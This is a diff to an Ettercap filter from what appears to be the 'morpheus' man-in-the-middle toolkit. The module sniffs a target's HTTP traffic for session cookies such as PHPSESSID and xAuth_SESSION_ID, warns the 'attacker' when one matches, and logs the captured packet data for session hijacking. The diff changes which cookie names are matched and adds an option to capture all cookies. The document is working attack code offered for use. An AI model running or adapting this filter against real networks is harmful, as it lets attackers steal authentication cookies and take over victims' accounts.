@@ -16,6 +16,7 @@
 #  from selected target host, And it will warn attacker If any auth
 #  cookie its captured And stored into morpheus/logs/sidejacking.log 
 #  'this module will accept morpheus inputs (one cookie name to filter)'
+#  input the value 'Cookie' to capture even non-auth cookies.
 ##
 
 
@@ -24,7 +25,7 @@
 # Report port 443/tcp (HTTPS) only to make terminal displays.
 #
 if (ip.proto == TCP && tcp.src == 443 || tcp.dst == 443) {
- msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:443 HTTPS ☆");
+ msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:443 https ☆");
 }
 
 
@@ -33,9 +34,9 @@ if (ip.proto == TCP && tcp.src == 443 || tcp.dst == 443) {
 # And warn attacker If any auth cookie has captured...
 #
 if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
- msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:80 HTTP ☆");
+ msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:80 http ☆");
   # search For string authcookie inside head field.
-  if (search(DATA.data, "autologinid")) {
+  if (search(DATA.data, "uuid=")) {
     msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
     msg("[morpheus] | status: AuthCookie detected ☠");
     msg("[morpheus] |  port : 80/TCP authentication ✔");
@@ -43,7 +44,7 @@ if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
     msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
     log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
   }else{
-  if (search(DATA.data, "phpbb_zforum_sid=")) {
+  if (search(DATA.data, "xAuth_SESSION_ID=")) {
     msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
     msg("[morpheus] | status: AuthCookie detected ☠");
     msg("[morpheus] |  port : 80/TCP authentication ✔");
@@ -51,7 +52,7 @@ if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
     msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
     log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
   }else{
-  if (search(DATA.data, "xAuth_SESSION_ID")) {
+  if (search(DATA.data, "PHPSESSID=")) {
     msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
     msg("[morpheus] | status: AuthCookie detected ☠");
     msg("[morpheus] |  port : 80/TCP authentication ✔");
@@ -63,7 +64,7 @@ if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
     msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
     msg("[morpheus] | status: AuthCookie detected ☠");
     msg("[morpheus] |  port : 80/TCP authentication ✔");
-    msg("[morpheus] |  info : credentials found, log stored ✔");
+    msg("[morpheus] |  info : UsErInPut found, log stored ✔");
     msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
     log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
   }
